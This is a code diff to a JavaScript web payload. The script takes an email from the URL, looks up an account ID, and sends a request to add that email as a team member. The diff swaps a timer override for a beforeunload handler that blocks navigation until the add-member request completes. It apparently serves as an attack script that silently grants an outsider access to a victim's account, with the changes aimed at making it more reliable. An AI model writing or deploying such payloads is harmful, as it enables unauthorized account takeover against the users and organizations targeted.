@@ -9,23 +9,15 @@ const email = urlParams.get('email');
 if (!email) {
     console.error("Email parameter is missing in the URL");
 } else {
-    // Override setTimeout and setInterval
-    const originalSetTimeout = window.setTimeout;
-    const originalSetInterval = window.setInterval;
-    
-    window.setTimeout = function(callback, delay) {
-        // Prevent redirection by delaying the execution
-        return originalSetTimeout(() => {
-            if (typeof callback === "function") callback();
-        }, delay);
-    };
+    let isRedirectPrevented = true; // Flag to indicate redirection prevention
 
-    window.setInterval = function(callback, delay) {
-        // Prevent redirection by delaying the execution
-        return originalSetInterval(() => {
-            if (typeof callback === "function") callback();
-        }, delay);
-    };
+    // Prevent the default navigation behavior
+    window.addEventListener('beforeunload', function (event) {
+        if (isRedirectPrevented) {
+            event.preventDefault(); // Prevent the default action
+            event.returnValue = ''; // Chrome requires returnValue to be set
+        }
+    });
 
     // Step 2: Send XHR request to get account_id
     const getAccounts = new XMLHttpRequest();
@@ -56,9 +48,7 @@ if (!email) {
                     addTeamMember.onreadystatechange = function () {
                         if (addTeamMember.readyState === 4) {
                             console.log('Add Team Member Response:', addTeamMember.responseText);
-                            // Restore original setTimeout and setInterval after completion
-                            window.setTimeout = originalSetTimeout;
-                            window.setInterval = originalSetInterval;
+                            isRedirectPrevented = false; // Allow redirection after completion
                         }
                     };
                     const requestBody = {
